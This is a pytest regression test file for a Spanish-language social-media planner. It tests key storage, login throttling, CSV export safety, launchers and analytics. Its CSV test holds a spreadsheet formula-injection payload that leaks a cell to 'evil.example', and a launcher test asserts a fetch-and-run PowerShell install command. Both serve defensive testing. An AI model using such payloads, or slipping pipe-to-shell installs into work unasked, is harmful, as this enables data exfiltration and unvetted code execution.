"""Regression tests for the core review fixes (crypto key safety, DB pool use, CSV protection, time zones,
static MIME types, console QuickEdit, launchers, analytics flow days, CSV round trip, brand deletion)."""

from __future__ import annotations

import json
import time
from pathlib import Path
from typing import Any

import pytest

from planificador import crypto

# ============================================================================== [0]/[9] master key safety


class FakeKeyring:
    """In-memory keyring whose ``get_password`` can be made to fail or hang."""

    def __init__(self) -> None:
        self.store: dict[tuple[str, str], str] = {}
        self.fail: BaseException | None = None
        self.delay = 0.0
        self.get_calls = 0

    def get_password(self, service: str, user: str) -> str | None:
        self.get_calls += 1
        if self.delay:
            time.sleep(self.delay)
        if self.fail is not None:
            raise self.fail
        return self.store.get((service, user))

    def set_password(self, service: str, user: str, value: str) -> None:
        self.store[(service, user)] = value


@pytest.fixture
def fake_keyring(monkeypatch: pytest.MonkeyPatch) -> FakeKeyring:
    import keyring

    fake = FakeKeyring()
    monkeypatch.setattr(keyring, "get_password", fake.get_password)
    monkeypatch.setattr(keyring, "set_password", fake.set_password)
    monkeypatch.setattr(crypto, "KEYRING_RETRY_DELAY_S", 0.0)
    monkeypatch.delenv(crypto.ENV_RESET_KEY, raising=False)
    return fake


def test_transient_keyring_failure_never_replaces_the_master_key(
    tmp_path: Path, fake_keyring: FakeKeyring
) -> None:
    key_file = tmp_path / "secret.key"
    first = crypto.load_or_create_master_key(key_file, use_keyring=True, has_encrypted_data=lambda: False)
    assert first.source == "keyring"
    token = crypto.SecretBox(first).encrypt("meta-app-secret")
    marker = json.loads(crypto.marker_path(key_file).read_text(encoding="utf-8"))
    assert marker["source"] == "keyring" and marker["fingerprint"] == crypto.key_fingerprint(first.key)
    assert first.key.decode() not in crypto.marker_path(key_file).read_text(encoding="utf-8")

    # Run 2: the keyring call fails (locked keychain, D-Bus hiccup...) while secrets are stored.
    fake_keyring.fail = TimeoutError("keyring call timed out")
    with pytest.raises(crypto.MasterKeyUnavailable, match="no va a crear una clave nueva"):
        crypto.load_or_create_master_key(key_file, use_keyring=True, has_encrypted_data=lambda: True)
    assert not key_file.exists()  # no secret.key minted
    assert fake_keyring.get_calls >= 3  # first try + one retry (after the initial successful runs)

    # Run 3: the keyring works again → the original key, old secrets still readable.
    fake_keyring.fail = None
    third = crypto.load_or_create_master_key(key_file, use_keyring=True, has_encrypted_data=lambda: True)
    assert third.source == "keyring" and third.key == first.key
    assert crypto.SecretBox(third).decrypt(token) == "meta-app-secret"


def test_keyring_failure_without_callback_uses_the_marker(tmp_path: Path, fake_keyring: FakeKeyring) -> None:
    key_file = tmp_path / "secret.key"
    crypto.load_or_create_master_key(key_file, use_keyring=True)
    fake_keyring.fail = OSError("dbus")
    with pytest.raises(crypto.MasterKeyUnavailable):
        crypto.load_or_create_master_key(key_file, use_keyring=True)
    assert not key_file.exists()


def test_keyring_failure_on_fresh_install_still_falls_back_to_file(
    tmp_path: Path, fake_keyring: FakeKeyring
) -> None:
    fake_keyring.fail = OSError("no backend")
    key_file = tmp_path / "secret.key"
    master = crypto.load_or_create_master_key(key_file, use_keyring=True, has_encrypted_data=lambda: False)
    assert master.source == "file" and key_file.is_file()
    assert json.loads(crypto.marker_path(key_file).read_text(encoding="utf-8"))["source"] == "file"


def test_slow_keyring_gets_more_time_when_secrets_exist(
    tmp_path: Path, fake_keyring: FakeKeyring, monkeypatch: pytest.MonkeyPatch
) -> None:
    key_file = tmp_path / "secret.key"
    first = crypto.load_or_create_master_key(key_file, use_keyring=True)
    monkeypatch.setattr(crypto, "KEYRING_TIMEOUT_S", 0.05)
    monkeypatch.setattr(crypto, "KEYRING_PATIENCE_S", 5.0)
    fake_keyring.delay = 0.3  # e.g. the user answering a keychain prompt
    calls_before = fake_keyring.get_calls
    again = crypto.load_or_create_master_key(key_file, use_keyring=True, has_encrypted_data=lambda: True)
    assert again.key == first.key and again.source == "keyring"
    assert fake_keyring.get_calls == calls_before + 1  # waited on the same call, no second prompt


def test_reset_env_allows_starting_over(
    tmp_path: Path, fake_keyring: FakeKeyring, monkeypatch: pytest.MonkeyPatch
) -> None:
    key_file = tmp_path / "secret.key"
    first = crypto.load_or_create_master_key(key_file, use_keyring=True)
    fake_keyring.fail = TimeoutError("timed out")
    monkeypatch.setenv(crypto.ENV_RESET_KEY, "1")
    master = crypto.load_or_create_master_key(key_file, use_keyring=True, has_encrypted_data=lambda: True)
    assert master.source == "file" and master.key != first.key


def test_mismatching_key_is_refused(tmp_path: Path, fake_keyring: FakeKeyring) -> None:
    from cryptography.fernet import Fernet

    key_file = tmp_path / "secret.key"
    crypto.load_or_create_master_key(key_file, use_keyring=True)
    # The keyring entry got replaced by another key (e.g. minted for another data folder).
    fake_keyring.store[(crypto.KEYRING_SERVICE, crypto.KEYRING_USERNAME)] = Fernet.generate_key().decode()
    with pytest.raises(crypto.MasterKeyUnavailable, match="no es la que cifró"):
        crypto.load_or_create_master_key(key_file, use_keyring=True, has_encrypted_data=lambda: True)
    # Nothing encrypted yet → the new key is simply adopted.
    other = crypto.load_or_create_master_key(key_file, use_keyring=True, has_encrypted_data=lambda: False)
    assert other.source == "keyring"
    marker = json.loads(crypto.marker_path(key_file).read_text(encoding="utf-8"))
    assert marker["fingerprint"] == crypto.key_fingerprint(other.key)


def test_no_keyring_env_on_keyring_install_is_refused(tmp_path: Path, fake_keyring: FakeKeyring) -> None:
    key_file = tmp_path / "secret.key"
    crypto.load_or_create_master_key(key_file, use_keyring=True)
    with pytest.raises(crypto.MasterKeyUnavailable, match="PLANIFICADOR_NO_KEYRING"):
        crypto.load_or_create_master_key(key_file, use_keyring=False, has_encrypted_data=lambda: True)
    assert not key_file.exists()


def test_keyring_without_entry_mints_a_new_key_for_a_restored_folder(
    tmp_path: Path, fake_keyring: FakeKeyring
) -> None:
    """Restoring the data folder on another PC: the keyring answers "no entry" → a new key (README)."""
    key_file = tmp_path / "secret.key"
    first = crypto.load_or_create_master_key(key_file, use_keyring=True)
    fake_keyring.store.clear()
    second = crypto.load_or_create_master_key(key_file, use_keyring=True, has_encrypted_data=lambda: True)
    assert second.source == "keyring" and second.key != first.key


def test_has_encrypted_values_detects_stored_secrets(app: Any, db: Any) -> None:
    from planificador import config
    from planificador.db import has_encrypted_values

    path = app.state.paths.db_path
    assert has_encrypted_values(path) is False
    config.set_setting(db, "meta_app_secret", "s3cr3t")
    assert has_encrypted_values(path) is True
    assert has_encrypted_values(path.with_name("missing.sqlite3")) is False


def test_cli_prints_spanish_error_when_master_key_is_unavailable(
    monkeypatch: pytest.MonkeyPatch, capsys: pytest.CaptureFixture[str], tmp_path: Path
) -> None:
    from planificador import __main__ as cli
    from planificador import app as app_module

    def boom(*_a: Any, **_k: Any) -> None:
        raise crypto.MasterKeyUnavailable("No se ha podido leer la clave de cifrado")

    monkeypatch.setattr(app_module, "create_app", boom)
    assert cli.main(["--no-browser", "--data-dir", str(tmp_path / "d")]) == 1
    assert "No se ha podido leer la clave de cifrado" in capsys.readouterr().err


# ========================================================================= [5] static MIME types (Windows)


def test_static_js_is_served_as_javascript_even_if_registry_says_text_plain(
    app_settings: Any, clock: Any
) -> None:
    import mimetypes

    from fastapi.testclient import TestClient

    from planificador.app import create_app

    # What ``mimetypes.init()`` does on a Windows PC with HKCR\.js "Content Type" = text/plain.
    mimetypes.add_type("text/plain", ".js")
    mimetypes.add_type("text/plain", ".css")
    try:
        application = create_app(app_settings, clock=clock)
        with TestClient(application, base_url="http://localhost:8765") as c:
            for path in ("/static/js/app.js", "/static/vendor/htmx.org/htmx.min.js"):
                response = c.get(path)
                assert response.status_code == 200, path
                assert response.headers["content-type"].startswith("text/javascript"), path
                assert response.headers["x-content-type-options"] == "nosniff"
            css = c.get("/static/css/app.css")
            assert css.headers["content-type"].startswith("text/css")
        application.state.db.dispose()
    finally:
        mimetypes.add_type("text/javascript", ".js")
        mimetypes.add_type("text/css", ".css")


# ================================================================ [6] console QuickEdit + console logging


class FakeKernel32:
    def __init__(self, mode: int, handle: int = 44) -> None:
        self.mode = mode
        self.handle = handle
        self.set_calls: list[tuple[int, int]] = []
        self.requested: list[int] = []

    def GetStdHandle(self, which: int) -> int:  # noqa: N802 - Win32 name
        self.requested.append(which)
        return self.handle

    def GetConsoleMode(self, handle: int, mode_ref: Any) -> int:  # noqa: N802
        mode_ref._obj.value = self.mode
        return 1

    def SetConsoleMode(self, handle: int, mode: int) -> int:  # noqa: N802
        self.set_calls.append((handle, mode))
        self.mode = mode
        return 1


def test_quick_edit_is_disabled_on_the_console() -> None:
    from planificador import __main__ as cli

    # Typical conhost default: processed input | line input | echo | insert | QuickEdit | extended flags.
    kernel = FakeKernel32(mode=0x0001 | 0x0002 | 0x0004 | 0x0020 | 0x0040 | 0x0080)
    assert cli.disable_console_quick_edit(kernel) is True
    assert kernel.requested == [0xFFFFFFF6]  # STD_INPUT_HANDLE
    (_, mode) = kernel.set_calls[0]
    assert not mode & cli.ENABLE_QUICK_EDIT_MODE and mode & cli.ENABLE_EXTENDED_FLAGS
    assert mode & 0x0020  # other flags kept (insert mode)
    assert cli.disable_console_quick_edit(kernel) is False  # already off → nothing to do
    assert cli.disable_console_quick_edit(FakeKernel32(mode=0x40, handle=0)) is False  # no console


def test_console_log_skips_access_lines_but_app_log_keeps_them(tmp_path: Path) -> None:
    import logging

    from planificador.app import setup_logging
    from planificador.paths import DataPaths

    paths = DataPaths(tmp_path / "d")
    setup_logging(paths, console=True)
    root = logging.getLogger()
    ours = [h for h in root.handlers if getattr(h, "_planificador", False)]
    try:
        console = next(h for h in ours if type(h) is logging.StreamHandler)
        file_handler = next(h for h in ours if h is not console)
        access = logging.LogRecord("uvicorn.access", logging.INFO, __file__, 1, "GET / 200", None, None)
        event = logging.LogRecord("planificador.engine", logging.INFO, __file__, 1, "Published", None, None)
        assert console.filter(access) is False and console.filter(event)
        assert file_handler.filter(access)
    finally:
        for handler in ours:
            root.removeHandler(handler)
            handler.close()


# ============================================================================ [7]/[8]/[10]/[11] launchers

ROOT = Path(__file__).resolve().parents[1]


def test_windows_launcher_commands() -> None:
    raw = (ROOT / "iniciar.bat").read_bytes()
    assert b"\r\n" in raw and b"\n" not in raw.replace(b"\r\n", b"")  # CRLF only
    text = raw.decode("utf-8")
    # [7] Inside double quotes cmd prints ^ literally: the fallback command must not contain "^|".
    fallback = next(line for line in text.splitlines() if "install.ps1" in line)
    assert "^|" not in fallback and '"irm https://astral.sh/uv/install.ps1 | iex"' in fallback
    # [8] HEIC support is installed (and an exact sync never removes it).
    sync = next(line for line in text.splitlines() if line.startswith("uv sync"))
    run = next(line for line in text.splitlines() if line.startswith("uv run"))
    assert "--extra heic" in sync and "--extra heic" in run
    # [10] Always uv's own Python (no Microsoft Store / Anaconda interpreter).
    assert 'set "UV_PYTHON_PREFERENCE=only-managed"' in text
    # [11] Running from inside the ZIP is detected before uv; failures are not blamed on the network only.
    assert text.index('if not exist "pyproject.toml" goto :not_extracted') < text.index("uv sync")
    assert ":not_extracted" in text and "Extraer todo" in text
    sync_failed = text[text.index(":sync_failed") :]
    assert "Revisa el mensaje de error de arriba" in sync_failed
    assert "--data-dir" in text[text.index(":run_failed") :]


def test_posix_launcher_commands() -> None:
    text = (ROOT / "iniciar.sh").read_text(encoding="utf-8")
    assert "uv sync --frozen --no-dev --extra heic" in text
    assert "uv run --frozen --no-dev --extra heic planificador" in text
    assert "UV_PYTHON_PREFERENCE:=only-managed" in text
    assert "[ ! -f pyproject.toml ]" in text


def test_heic_extra_is_locked_for_windows() -> None:
    lock = (ROOT / "uv.lock").read_text(encoding="utf-8")
    assert "pillow_heif" in lock and "win_amd64.whl" in lock


# ================================================================ [2] analytics CSV formula protection


def _csv_rows(text: str) -> list[list[str]]:
    import csv
    import io

    return list(csv.reader(io.StringIO(text.lstrip("﻿")), delimiter=";"))


def test_analytics_posts_csv_protects_formulas() -> None:
    from planificador import analytics

    evil = '=HYPERLINK("https://evil.example/?x="&A1,"clic")'
    rows = [
        {"caption": evil, "permalink": "@marca", "views": -3, "engagement": -1.5},
        {"caption": "+info en bio", "media_type_label": "-20% solo hoy"},
        {"caption": "- lista con guion"},
        {"caption": "-"},
    ]
    parsed = _csv_rows(analytics.posts_csv(rows, "instagram"))
    header = parsed[0]
    texto, tipo, enlace = header.index("texto"), header.index("tipo"), header.index("enlace")
    assert parsed[1][texto] == "'" + evil
    assert parsed[1][enlace] == "'@marca"
    assert parsed[1][header.index("visualizaciones")] == "-3"  # numbers stay numbers
    assert parsed[1][header.index("engagement_%")] == "-1,5"
    assert parsed[2][texto] == "'+info en bio" and parsed[2][tipo] == "'-20% solo hoy"
    assert parsed[3][texto] == "'- lista con guion"
    assert parsed[4][texto] == "-"


def test_shared_protect_cell_covers_dash_space_and_round_trips() -> None:
    from planificador.csvio import _clean_cell
    from planificador.csvsafe import protect_cell

    for value in ("- =1+1", "-5", "=SUM(A1)", "+34 600", "@user", "\tx"):
        assert protect_cell(value).startswith("'"), value
    for value in ("hola", "", "-", "5 - 3"):
        assert protect_cell(value) == value
    for value in ("- =1+1", "=SUM(A1)", "+34 600", "@user", "-20% hoy"):
        assert _clean_cell(protect_cell(value)) == value


# ================================================================== [15] CSV blank rows and the row limit


def test_csv_blank_rows_do_not_count_towards_the_limit(db: Any, brand: Any, clock: Any) -> None:
    from planificador import csvio

    header = ";".join(csvio.TEMPLATE_COLUMNS)
    row = "2026-11-10;10:00;Hola;si;no;no;no;post;;;;;;si;;;;"
    blank = ";" * (len(csvio.TEMPLATE_COLUMNS) - 1)
    text = "\r\n".join([header, row, blank, row] + [blank] * 600) + "\r\n"
    preview = csvio.build_preview(db, brand, text.encode("utf-8"), clock)
    assert not any("Demasiadas filas" in e for e in preview.file_errors)
    assert len(preview.data_rows) == 2
    assert preview.empty_count == 1  # the blank line between posts; trailing Excel lines are dropped

    too_many = "\r\n".join([header] + [row] * (csvio.MAX_ROWS + 1) + [blank] * 10) + "\r\n"
    preview = csvio.build_preview(db, brand, too_many.encode("utf-8"), clock)
    assert preview.file_errors == [
        f"Demasiadas filas ({csvio.MAX_ROWS + 1}). El máximo es {csvio.MAX_ROWS} por archivo."
    ]


# ======================================================================== [13] CSV export → import round trip


def _account(db: Any, brand: Any, network: str, **kw: Any) -> Any:
    from planificador.models import Account, AccountStatus

    account = Account(
        brand_id=brand.id,
        network=network,
        external_id=f"{network}-1",
        name=f"Cuenta {network}",
        username=network,
        status=AccountStatus.CONNECTED,
        account_type=kw.pop("account_type", None),
        meta=kw.pop("meta", {}),
    )
    db.add(account)
    db.commit()
    return account


def _video(db: Any, brand: Any, name: str = "v.mp4") -> Any:
    from planificador.models import MediaAsset, MediaKind

    sha = name.encode().hex().ljust(64, "0")[:64]
    asset = MediaAsset(
        brand_id=brand.id,
        kind=MediaKind.VIDEO,
        original_name=name,
        rel_path=f"originals/{sha[:2]}/{sha}.mp4",
        sha256=sha,
        size_bytes=1000,
        mime="video/mp4",
        width=1080,
        height=1920,
        duration_s=20.0,
    )
    db.add(asset)
    db.commit()
    return asset


def test_csv_round_trip_keeps_autopublish_and_first_comments(db: Any, brand: Any, clock: Any) -> None:
    from datetime import timedelta

    from planificador import csvio, postsvc
    from planificador.postsvc import PostInput, TargetInput

    fb = _account(db, brand, "facebook", account_type="page")
    ig = _account(db, brand, "instagram", account_type="business")
    yt = _account(db, brand, "youtube", account_type="channel")
    clip = _video(db, brand)
    when = clock.now() + timedelta(days=2)

    def make(targets: list[TargetInput], text: str) -> None:
        data = PostInput(
            brand_id=brand.id, text=text, media_ids=[clip.id], scheduled_at=when, targets=targets
        )
        postsvc.create_post(db, data, "draft", clock)

    # 1. IG automatic with a first comment, YouTube assisted (its default) and made for kids.
    make(
        [
            TargetInput(
                account_id=ig.id, format="reel", auto_publish=True, options={"first_comment": "#tags"}
            ),
            TargetInput(
                account_id=yt.id,
                format="short",
                auto_publish=False,
                options={"made_for_kids": True, "title": "T", "privacy_status": "public"},
            ),
        ],
        "uno",
    )
    # 2. Facebook assisted, Instagram automatic (cannot be said with a single si/no).
    make(
        [
            TargetInput(account_id=fb.id, format="post", auto_publish=False),
            TargetInput(account_id=ig.id, format="reel", auto_publish=True),
        ],
        "dos",
    )
    # 3. Different first comments on Instagram and YouTube (not for kids).
    make(
        [
            TargetInput(account_id=ig.id, format="reel", options={"first_comment": "#ig"}),
            TargetInput(
                account_id=yt.id,
                format="short",
                auto_publish=False,
                options={"made_for_kids": False, "title": "T", "first_comment": "¡Hola YT!"},
            ),
        ],
        "tres",
    )

    start = when.date() - timedelta(days=1)
    raw = csvio.export_csv(db, brand, start, start + timedelta(days=3))
    exported = {r["texto"]: r for r in _dict_rows(raw)}
    assert exported["uno"]["autopublicar"] == ""  # each network on its default
    assert exported["dos"]["autopublicar"] == "instagram"
    assert (
        exported["uno"]["primer_comentario"] == "#tags" and exported["uno"]["primer_comentario_youtube"] == ""
    )

    preview = csvio.build_preview(db, brand, raw, clock)
    assert preview.notices == []
    by_text = {r.text: r for r in preview.data_rows}

    one = {t.account_id: t for t in by_text["uno"].data.targets}
    assert one[ig.id].auto_publish is True and one[yt.id].auto_publish is False
    assert one[ig.id].options["first_comment"] == "#tags"
    assert "first_comment" not in one[yt.id].options
    assert not any("niños no admiten comentarios" in i.message for i in by_text["uno"].errors)

    two = {t.account_id: t for t in by_text["dos"].data.targets}
    assert two[fb.id].auto_publish is False and two[ig.id].auto_publish is True

    three = {t.account_id: t for t in by_text["tres"].data.targets}
    assert three[ig.id].options["first_comment"] == "#ig"
    assert three[yt.id].options["first_comment"] == "¡Hola YT!"


def _dict_rows(raw: bytes) -> list[dict[str, str]]:
    import csv
    import io

    return list(csv.DictReader(io.StringIO(raw.decode("utf-8-sig")), delimiter=";"))


def test_csv_template_first_comment_skips_kids_youtube(db: Any, brand: Any, clock: Any) -> None:
    from planificador import csvio

    _account(db, brand, "instagram", account_type="business")
    _account(db, brand, "youtube", account_type="channel")
    _video(db, brand, "clip.mp4")
    columns = csvio.TEMPLATE_COLUMNS
    values = {
        "fecha": "2026-11-10",
        "hora": "10:30",
        "texto": "Hola",
        "instagram": "si",
        "youtube": "si",
        "formato_instagram": "reel",
        "formato_youtube": "short",
        "medios": "clip.mp4",
        "primer_comentario": "#tags",
        "ninos_youtube": "si",
        "autopublicar": "instagram, youtube",
    }
    text = ";".join(columns) + "\n" + ";".join(values.get(c, "") for c in columns) + "\n"
    row = csvio.build_preview(db, brand, text.encode("utf-8"), clock).data_rows[0]
    ig_t, yt_t = row.data.targets
    assert ig_t.options["first_comment"] == "#tags" and "first_comment" not in yt_t.options
    assert any("niños no admiten comentarios" in i.message for i in row.warnings)
    assert ig_t.auto_publish is True and yt_t.auto_publish is True

    values["autopublicar"] = "quizá"
    text = ";".join(columns) + "\n" + ";".join(values.get(c, "") for c in columns) + "\n"
    row = csvio.build_preview(db, brand, text.encode("utf-8"), clock).data_rows[0]
    assert any("Valor no válido en «autopublicar»" in i.message for i in row.errors)


# ============================================================================ [14] brand deletion and media


def test_deleting_a_brand_does_not_share_its_media(db: Any, clock: Any) -> None:
    from datetime import timedelta

    from planificador import media
    from planificador.models import Brand, MediaAsset, Post, PostMedia

    a, b = Brand(name="A"), Brand(name="B")
    db.add_all([a, b])
    db.commit()
    private = _video(db, a, "secreto.mp4")
    used = _video(db, a, "usado-en-b.mp4")
    # A post of brand B that uses one of A's files (e.g. created while the file was shared).
    post = Post(brand_id=b.id, text="x", scheduled_at=clock.now() + timedelta(days=1))
    db.add(post)
    db.flush()
    db.add(PostMedia(post_id=post.id, media_id=used.id, position=0))
    db.commit()
    a.archived_at = clock.now()
    db.commit()
    db.delete(a)
    db.commit()
    db.expire_all()

    visible = {asset.id for asset in media.query_assets(db, b.id)[0]}
    assert private.id not in visible
    assert db.get(MediaAsset, private.id).deleted_at is not None
    assert used.id in visible  # still needed by brand B's post
    assert db.get(MediaAsset, used.id).deleted_at is None


# ================================================================ [1] DB pool never deadlocks on renders


def _csrf(client: Any) -> str:
    return client.get("/api/csrf").json()["csrf_token"]


def test_engine_never_waits_for_a_pooled_connection(tmp_path: Path) -> None:
    import threading

    from sqlalchemy import text

    from planificador.db import Database

    database = Database(tmp_path / "pool.sqlite3")
    database.init()
    try:
        # Each concurrent render holds two connections (route session + template globals); with the old
        # bounded pool (5 + 10) the 16th checkout waited 30 s and then failed.
        held = [database.engine.connect() for _ in range(40)]
        started = time.monotonic()
        extra = database.engine.connect()
        assert time.monotonic() - started < 2
        extra.close()
        for conn in held:
            conn.close()

        errors: list[BaseException] = []

        def render_like() -> None:
            try:
                with database.session() as route_session:
                    route_session.execute(text("SELECT 1"))
                    with database.session() as globals_session:
                        globals_session.execute(text("SELECT 1"))
                        time.sleep(0.05)
            except BaseException as exc:  # noqa: BLE001
                errors.append(exc)

        threads = [threading.Thread(target=render_like) for _ in range(30)]
        for t in threads:
            t.start()
        for t in threads:
            t.join(10)
        assert not errors and not any(t.is_alive() for t in threads)
    finally:
        database.dispose()


def test_login_submit_releases_its_session_before_rendering(
    client: Any, db: Any, app: Any, monkeypatch: pytest.MonkeyPatch
) -> None:
    from planificador import security

    security.set_password(db, "clave-123")
    db.close()
    app.state.login_throttle = security.LoginThrottle(sleep=lambda _s: None)
    seen: list[int] = []
    real = security._login_page

    def spy(request: Any, **kw: Any) -> Any:
        seen.append(request.app.state.db.engine.pool.checkedout())
        return real(request, **kw)

    monkeypatch.setattr(security, "_login_page", spy)
    token = _csrf(client)
    response = client.post("/login", data={"password": "mal", "csrf_token": token})
    assert response.status_code == 401
    assert seen == [0]  # no connection held while the error page renders


def test_template_globals_stop_after_the_first_database_error(
    app: Any, monkeypatch: pytest.MonkeyPatch
) -> None:
    from sqlalchemy.exc import TimeoutError as PoolTimeout
    from starlette.requests import Request

    from planificador import templating

    calls: list[str] = []

    class BrokenSession:
        def scalars(self, *_a: Any, **_k: Any) -> Any:
            calls.append("scalars")
            raise PoolTimeout("QueuePool limit reached")

        def execute(self, *_a: Any, **_k: Any) -> Any:
            calls.append("execute")
            raise PoolTimeout("QueuePool limit reached")

        def scalar(self, *_a: Any, **_k: Any) -> Any:
            calls.append("scalar")
            raise PoolTimeout("QueuePool limit reached")

        def rollback(self) -> None:
            pass

        def close(self) -> None:
            pass

    class FakeDb:
        def session(self) -> BrokenSession:
            return BrokenSession()

    class FakeApp:
        class state:  # noqa: N801
            db = FakeDb()

    request = Request({"type": "http", "method": "GET", "path": "/", "headers": [], "app": FakeApp()})
    out = templating._db_context(request)
    assert out["brands"] == [] and out["unread_notifications"] == 0
    assert calls == ["scalars"]  # every later query skipped instead of waiting again


# ===================================================================== [3] login throttle (brute force)


class FakeTime:
    def __init__(self) -> None:
        self.t = 1000.0
        self.slept: list[float] = []

    def now(self) -> float:
        return self.t

    def sleep(self, seconds: float) -> None:
        self.slept.append(seconds)


def test_login_throttle_backs_off_globally() -> None:
    from planificador.security import LoginThrottle

    clock = FakeTime()
    throttle = LoginThrottle(now=clock.now, sleep=clock.sleep)
    checks: list[int] = []

    def wrong() -> bool:
        checks.append(1)
        return False

    for _ in range(LoginThrottle.FREE_FAILURES):
        assert throttle.attempt(wrong) == ("wrong", 0.0)
    assert throttle.attempt(wrong) == ("wrong", 1.0)  # 4th failure: 1 s block for everybody
    assert clock.slept == [LoginThrottle.FAIL_DELAY_S] * 4
    before = len(checks)
    assert throttle.attempt(lambda: True)[0] == "blocked"  # not even checked while blocked
    assert len(checks) == before
    clock.t += 1.0
    assert throttle.attempt(wrong) == ("wrong", 2.0)  # exponential
    clock.t += 2.0
    assert throttle.attempt(wrong) == ("wrong", 4.0)
    clock.t += 4.0
    assert throttle.attempt(lambda: True) == ("ok", 0.0)  # success resets
    assert throttle.attempt(wrong) == ("wrong", 0.0)
    for _ in range(40):
        clock.t += 10_000.0  # long gaps: each failure forgotten (reset after RESET_AFTER_S)
        assert throttle.attempt(wrong) == ("wrong", 0.0)
    for _ in range(30):
        clock.t += throttle.retry_after()
        throttle.attempt(wrong)
    assert throttle.retry_after() == LoginThrottle.MAX_BLOCK_S


def test_login_throttle_serialises_parallel_guesses() -> None:
    import threading

    from planificador.security import LoginThrottle

    throttle = LoginThrottle(sleep=lambda _s: time.sleep(0.01))
    throttle.FREE_FAILURES = 1000
    active = [0]
    peak = [0]
    lock = threading.Lock()

    def check() -> bool:
        with lock:
            active[0] += 1
            peak[0] = max(peak[0], active[0])
        time.sleep(0.01)
        with lock:
            active[0] -= 1
        return False

    threads = [threading.Thread(target=throttle.attempt, args=(check,)) for _ in range(10)]
    for t in threads:
        t.start()
    for t in threads:
        t.join(10)
    assert peak[0] == 1 and throttle.failures == 10


def test_login_route_answers_429_while_blocked(client: Any, db: Any, app: Any) -> None:
    from planificador import security

    security.set_password(db, "clave-123")
    clock = FakeTime()
    app.state.login_throttle = security.LoginThrottle(now=clock.now, sleep=clock.sleep)
    token = _csrf(client)
    for _ in range(security.LoginThrottle.FREE_FAILURES):
        r = client.post("/login", data={"password": "mal", "csrf_token": token})
        assert r.status_code == 401 and "Retry-After" not in r.headers
    r = client.post("/login", data={"password": "mal", "csrf_token": token})
    assert r.status_code == 401 and r.headers["Retry-After"] == "1" and "espera 1 s" in r.text
    blocked = client.post(
        "/login", data={"password": "clave-123", "csrf_token": token}, follow_redirects=False
    )
    assert blocked.status_code == 429 and "Demasiados intentos" in blocked.text
    clock.t += 1.0
    ok = client.post("/login", data={"password": "clave-123", "csrf_token": token}, follow_redirects=False)
    assert ok.status_code == 303


# ============================================================================== [4] first-run time zone


def test_first_brand_takes_this_pcs_time_zone(client: Any, app: Any, monkeypatch: pytest.MonkeyPatch) -> None:
    from planificador import config
    from planificador.models import Brand

    monkeypatch.setenv("PLANIFICADOR_TIMEZONE", "America/Mexico_City")
    html = client.get("/planificacion").text
    with app.state.db.session() as s:
        brand = s.query(Brand).one()
        assert brand.timezone == "America/Mexico_City"
        assert config.get_setting(s, "default_timezone") == "America/Mexico_City"
    assert "hemos usado la de este ordenador (America/Mexico_City)" in html  # one-time notice
    assert "de este ordenador" not in client.get("/planificacion").text

    # An install from before the detection (no default zone chosen): the new-brand form proposes the active
    # brand's zone, not a hardcoded Europe/Madrid.
    with app.state.db.session() as s:
        config.delete_setting(s, "default_timezone")
    form = client.get("/marcas/nueva").text
    assert '<option value="America/Mexico_City" selected>' in form
    assert '<option value="Europe/Madrid" selected>' not in form


def test_explicit_default_time_zone_wins_over_detection(db: Any, monkeypatch: pytest.MonkeyPatch) -> None:
    from planificador import config
    from planificador.deps import ensure_active_brand

    config.set_setting(db, "default_timezone", "Europe/Lisbon")
    monkeypatch.setenv("PLANIFICADOR_TIMEZONE", "America/Mexico_City")
    assert ensure_active_brand(db).timezone == "Europe/Lisbon"


def test_system_timezone_detection(monkeypatch: pytest.MonkeyPatch) -> None:
    import tzlocal

    from planificador import timeutil

    monkeypatch.delenv("PLANIFICADOR_TIMEZONE", raising=False)
    monkeypatch.setattr(tzlocal, "get_localzone_name", lambda: "America/Mexico_City")
    assert timeutil.system_timezone() == "America/Mexico_City"
    monkeypatch.setattr(tzlocal, "get_localzone_name", lambda: "Etc/UTC")
    assert timeutil.system_timezone() is None  # containers/servers: keep the app default

    def broken() -> str:
        raise RuntimeError("no zone")

    monkeypatch.setattr(tzlocal, "get_localzone_name", broken)
    assert timeutil.system_timezone() is None
    monkeypatch.setenv("PLANIFICADOR_TIMEZONE", "Nowhere/Land")
    assert timeutil.system_timezone() is None
    monkeypatch.setenv("PLANIFICADOR_TIMEZONE", "off")
    assert timeutil.system_timezone() is None


# ================================================================= [12] Meta daily flow metrics settle later


def test_meta_snapshots_rewrite_flow_metrics_of_completed_days(db: Any, brand: Any, clock: Any) -> None:
    from datetime import UTC, date, datetime, timedelta

    import httpx
    from sqlalchemy import select

    from planificador import analytics
    from planificador.models import AnalyticsSnapshot
    from planificador.providers import registry
    from planificador.providers.base import (
        AccountSnapshot,
        FormatSpec,
        Provider,
        ProviderSettings,
        StepResult,
    )

    class MetaLike(Provider):
        network = "instagram"
        display_name = "Instagram (fake)"
        formats = [FormatSpec("post", "Post", "images_or_video")]

        def __init__(self) -> None:
            self.calls: list[date] = []
            self.today: date | None = None

        def publish_step(self, ctx: Any) -> StepResult:  # pragma: no cover - unused
            return StepResult("published")

        def fetch_account_snapshot(
            self, account: Any, settings: Any, http: Any, day: date
        ) -> AccountSnapshot:
            self.calls.append(day)
            if day == self.today:  # a day still running: only its first hours are counted
                return AccountSnapshot(day=day, metrics={"followers": 1000, "views": 300, "reach": 200})
            return AccountSnapshot(day=day, metrics={"followers": 1000, "views": 5000, "reach": 3000})

        def fetch_recent_posts(self, account: Any, settings: Any, http: Any, since: Any) -> list[Any]:
            return []

    ig = _account(db, brand, "instagram", account_type="business")
    fake = registry.register(MetaLike())
    settings = ProviderSettings(
        meta_app_id=None,
        meta_app_secret=None,
        meta_api_version="v25.0",
        tiktok_client_key=None,
        tiktok_client_secret=None,
        tiktok_pkce_encoding="hex",
        base_url="http://localhost:8765",
        demo_mode=False,
    )
    with httpx.Client(transport=httpx.MockTransport(lambda r: httpx.Response(500))) as http:
        clock.set(datetime(2026, 11, 3, 5, 10, tzinfo=UTC))  # the 06:10 Madrid job
        fake.today = date(2026, 11, 3)
        analytics.snapshot_all(db, http, clock, settings)
        assert fake.calls == [date(2026, 11, 3), date(2026, 11, 2), date(2026, 11, 1), date(2026, 10, 31)]
        clock.set(clock.now() + timedelta(days=1))
        fake.today = date(2026, 11, 4)
        analytics.snapshot_all(db, http, clock, settings)

    rows = {
        r.day: r.metrics
        for r in db.scalars(select(AnalyticsSnapshot).where(AnalyticsSnapshot.account_id == ig.id))
    }
    assert rows[date(2026, 11, 3)] == {"followers": 1000, "views": 5000, "reach": 3000}  # completed later
